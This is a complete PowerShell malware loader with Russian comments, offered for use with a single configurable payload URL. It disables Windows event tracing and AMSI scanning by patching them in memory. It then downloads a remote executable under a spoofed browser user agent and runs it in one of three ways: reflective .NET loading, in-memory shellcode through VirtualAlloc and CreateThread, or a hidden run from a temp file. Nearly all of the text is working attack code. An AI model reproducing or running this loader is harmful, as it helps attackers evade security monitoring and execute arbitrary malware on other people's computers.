# ---- Единственная настройка ----
$URL = "http://192.168.1.1:8080/payload.exe"
# --------------------------------

# --- ETW: обнуляем EtwEventWrite чтобы подавить логи провайдера PowerShell ---
try {
    $sig = @'
[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
[DllImport("kernel32")] public static extern IntPtr GetModuleHandle(string n);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, uint s, uint p, out uint o);
'@
    $k = Add-Type -MemberDefinition $sig -Name WK32 -Namespace Pw -PassThru -EA Stop
    $ntdll  = $k::GetModuleHandle("ntdll.dll")
    $etw    = $k::GetProcAddress($ntdll, "EtwEventWrite")
    $unused = [uint32]0
    if ($etw -ne [IntPtr]::Zero) {
        $k::VirtualProtect($etw, 6, 0x40, [ref]$unused) | Out-Null
        [System.Runtime.InteropServices.Marshal]::Copy([byte[]](0x48,0x33,0xC0,0xC3,0x90,0x90), 0, $etw, 6)
        $k::VirtualProtect($etw, 6, $unused, [ref]$unused) | Out-Null
    }
} catch {}

# --- AMSI: патчим AmsiScanBuffer (RET 0x80070057) ---
try {
    if (-not (Get-Variable -Name WK32 -EA SilentlyContinue)) {
        $sig = @'
[DllImport("kernel32")] public static extern IntPtr GetProcAddress(IntPtr h, string p);
[DllImport("kernel32")] public static extern IntPtr LoadLibrary(string n);
[DllImport("kernel32")] public static extern bool VirtualProtect(IntPtr a, uint s, uint p, out uint o);
'@
        $k = Add-Type -MemberDefinition $sig -Name WK32b -Namespace Pw -PassThru -EA Stop
    }
    $amsiLib  = $k::LoadLibrary("amsi.dll")
    $scanBuf  = $k::GetProcAddress($amsiLib, "AmsiScanBuffer")
    $unused   = [uint32]0
    if ($scanBuf -ne [IntPtr]::Zero) {
        $k::VirtualProtect($scanBuf, 8, 0x40, [ref]$unused) | Out-Null
        # xor eax,eax; ret   — возвращает AMSI_RESULT_CLEAN (0)
        [System.Runtime.InteropServices.Marshal]::Copy([byte[]](0x31,0xC0,0xC3,0x90,0x90,0x90,0x90,0x90), 0, $scanBuf, 8)
        $k::VirtualProtect($scanBuf, 8, $unused, [ref]$unused) | Out-Null
    }
} catch {}

# --- Загрузка: WebClient → HttpWebRequest ---
$bytes = $null
try {
    $wc = New-Object System.Net.WebClient
    $wc.Headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"
    $bytes = $wc.DownloadData($URL)
} catch {
    try {
        $req = [System.Net.HttpWebRequest]::Create($URL)
        $req.UserAgent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"
        $req.Timeout   = 30000
        $resp = $req.GetResponse()
        $ms   = New-Object System.IO.MemoryStream
        $resp.GetResponseStream().CopyTo($ms)
        $bytes = $ms.ToArray()
        $resp.Close()
    } catch { exit 1 }
}

if (-not $bytes -or $bytes.Length -lt 64) { exit 1 }

# --- Попытка 1: рефлективная загрузка как .NET сборка ---
$loaded = $false
try {
    $asm   = [System.Reflection.Assembly]::Load($bytes)
    $entry = $asm.EntryPoint
    if ($entry) {
        $params = if ($entry.GetParameters().Length -gt 0) { @(,[string[]]@()) } else { @() }
        $entry.Invoke($null, $params) | Out-Null
        $loaded = $true
    }
} catch {}

# --- Попытка 2: shellcode в памяти через VirtualAlloc + CreateThread ---
if (-not $loaded) {
    try {
        $sig2 = @'
[DllImport("kernel32")] public static extern IntPtr VirtualAlloc(IntPtr a, uint s, uint t, uint p);
[DllImport("kernel32")] public static extern IntPtr CreateThread(IntPtr sa, uint st, IntPtr fn, IntPtr pa, uint fl, out uint tid);
[DllImport("kernel32")] public static extern uint WaitForSingleObject(IntPtr h, uint ms);
'@
        $mem = Add-Type -MemberDefinition $sig2 -Name WMem -Namespace Pw -PassThru -EA Stop
        $ptr = $mem::VirtualAlloc([IntPtr]::Zero, $bytes.Length, 0x3000, 0x40)
        if ($ptr -ne [IntPtr]::Zero) {
            [System.Runtime.InteropServices.Marshal]::Copy($bytes, 0, $ptr, $bytes.Length)
            $tid = [uint32]0
            $thr = $mem::CreateThread([IntPtr]::Zero, 0, $ptr, [IntPtr]::Zero, 0, [ref]$tid)
            $mem::WaitForSingleObject($thr, 0xFFFFFFFF) | Out-Null
            $loaded = $true
        }
    } catch {}
}

# --- Fallback: запись на диск и запуск ---
if (-not $loaded) {
    $path = [System.IO.Path]::Combine(
        [System.IO.Path]::GetTempPath(),
        [System.IO.Path]::GetRandomFileName() -replace '\.[^.]+$','.exe'
    )
    [System.IO.File]::WriteAllBytes($path, $bytes)
    Start-Process -FilePath $path -WindowStyle Hidden
}
